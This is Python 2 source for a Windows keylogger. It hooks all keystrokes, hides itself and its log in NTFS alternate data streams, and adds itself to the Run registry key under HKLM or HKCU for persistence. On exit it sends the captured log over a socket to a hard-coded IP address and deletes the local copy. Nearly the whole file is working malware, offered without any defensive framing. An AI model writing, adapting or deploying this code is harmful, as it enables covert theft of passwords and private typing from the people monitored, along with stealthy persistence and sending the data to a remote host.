import pyHook
import pythoncom
import win32api, win32event
import sys
import shutil
import os
import socket
import atexit
import ctypes
import _winreg



def checkPriv():
    """
    Check if the current user has admin rights
    Return True if admin or False if not
    """
    try:
        is_admin = os.getuid() == 0
    except AttributeError:
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
    return is_admin


# log name
LOGFILE = 'log'

# file to attach log to
LOGHOST = 'some path to a file'

# file to hide in
HIDDEN = 'some path to a file:kloggy.py'


def hideSelf():
    """
    When the program runs, move it from its current location to a more stealthy
    location inside an ADS
    """
    # path of the program
    path = os.path.abspath(sys.argv[0])
    if path != HIDDEN:
        try:
            shutil.move(path, HIDDEN)
        except shutil.Error:
            return
hideSelf()

def logKeys(data):
    """
    Write the logged keys to a file and hide it in an ADS
    """

    try:
        with open("%s:%s" % (LOGHOST, LOGFILE), "a") as f:
        #with open(LOGFILE, 'a') as f:
            f.write(data)
    except IOError, e:
        print e
        sys.exit(1)


# remote host details for sending the log
ip = '192.168.127.131'
port = 80 

def sendLog(host, port):
    """
    Send log and clean up 
    """
    # read in file
    try:
        with open("%s:%s" % (LOGHOST, LOGFILE), 'r') as f:
            contents = f.read()
    except IOError, e:
        print e
        sys.exit(1)

    # length of the data that will be sent
    length = len(contents)

    # send the log contents 
    try:    
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((host, port))
        
        total = 0
        while total < length:
            sent = sock.send(contents[total:])
            if sent == 0:
                return
            total += sent
            if sent == length:
                # delete local log
                os.remove("%s:%s" % (LOGHOST, LOGFILE))
                
        sock.close()
    except socket.error, e:
        print e
        sock.close()
        return
  
    
# send the log when program exits
atexit.register(sendLog, ip, port)


# variables for registry constants #
HKLM = _winreg.HKEY_LOCAL_MACHINE
HKCU = _winreg.HKEY_CURRENT_USER


if checkPriv() == True:
    # reg handle for HKLM
    hklm_reg = _winreg.ConnectRegistry(None, HKLM)
else:
    # reg handle for HKCU
    hkcu_reg = _winreg.ConnectRegistry(None, HKCU)
    
startup = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"

# these will be added to registry if user is admin
hklm_key = 'Admin log'
hklm_val = 'python C:\\Users\\admin\\Desktop\\hideme.txt:kloggy.py' # example path

# these will be added to registry if user is not admin
hkcu_key = 'Standard log'
hkcu_val = 'python C:\\Users\\standarduser\\Desktop\\hideme.txt:kloggy.py' # example path


def checkRegVal(reg, regkey):
    """
    Check if registry entry already exists
    Return the entry if it does or False otherwise
	reg => registry handle
	regkey => name of the subkey for the keylogger
    """
    
    try:
        key = _winreg.OpenKey(reg, startup, 0, _winreg.KEY_READ)
    except WindowsError, e:
        print e
        return
    try:
        val = _winreg.QueryValueEx(key, regkey)
        return val
    except EnvironmentError:
            return False
    


def addToStartup():
    """
    Add script to startup by modifying the registry 
    """
    if checkPriv() == True:
   
        if checkRegVal(hklm_reg, hklm_key) == False:
        
            try:                  
                # get a handle to the desired key 
                key = _winreg.OpenKey(hklm_reg, startup, 0, _winreg.KEY_WRITE)               
                # set registry value  
                _winreg.SetValueEx(key,hklm_key,0, _winreg.REG_SZ, hklm_val)        
            except (WindowsError, EnvironmentError), e:
                print e
                return
            _winreg.CloseKey(key)
            _winreg.CloseKey(hklm_reg)
        else:
             return

    # if not admin
    else:
        # check first if entry was added for all users
        if checkRegVal(hklm_reg, hklm_key) == True:
            return
        
        # check if entry was added for current user
        elif checkRegVal(hkcu_reg, hkcu_key) == True:
            return
        
        # add entry if it wasn't present already
        else:
            try:
                key = _winreg.OpenKey(hkcu_reg, startup, 0, _winreg.KEY_WRITE)
                _winreg.SetValueEx(key,hkcu_key,0, _winreg.REG_SZ, hkcu_val)
            except (WindowsError, EnvironmentError), e:       
                print e
                return
            _winreg.CloseKey(key)
            _winreg.CloseKey(hkcu_reg)
   
          
addToStartup()    


            
def monitorKeys(event):
    """
    This function does the keylogging
    """
    data = ""
    if event.Ascii == 13:
        keys = '<ENTER>\n'
    elif event.Ascii == 8:
        keys = '<BACKSPACE>'
    elif event.Ascii == 9:
        keys = '<TAB>'
    elif event.Ascii == 127:
        keys = '<DELETE>'
    # debug only remove / comment out when done
    elif event.Ascii == 126:
        sys.exit(0)
    else:
        keys = chr(event.Ascii)
    data += keys
    logKeys(data)
    return True





# Registers and manages callbacks for low level mouse and keyboard events.
hook = pyHook.HookManager()

# Registers the given function as the callback for this keyboard event type.
# Use the KeyDown property as a shortcut.
hook.KeyDown = monitorKeys

# Begins watching for keyboard events. 
hook.HookKeyboard()

# Pumps all messages for the current thread until a WM_QUIT message.
pythoncom.PumpMessages()


    
    
